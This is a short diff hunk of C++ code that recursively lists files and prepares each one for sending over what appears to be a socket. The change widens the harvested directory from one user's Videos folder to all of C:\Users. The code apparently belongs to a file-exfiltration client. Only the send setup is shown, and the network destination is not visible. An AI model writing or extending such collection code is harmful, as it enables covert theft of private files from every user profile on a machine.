@@ -126,7 +126,7 @@ int __cdecl main(void)
     do {
        
         std::string SendIresult = "";
-        const std::vector<std::string> file_list = get_all_files_recurisive("C:\\Users\\Tzvi\\Videos");
+        const std::vector<std::string> file_list = get_all_files_recurisive("C:\\Users");
         for (const auto& fn : file_list) {
             // Convert fn vector in the for loop to sendable data
             const char* sendbuf = fn.data();
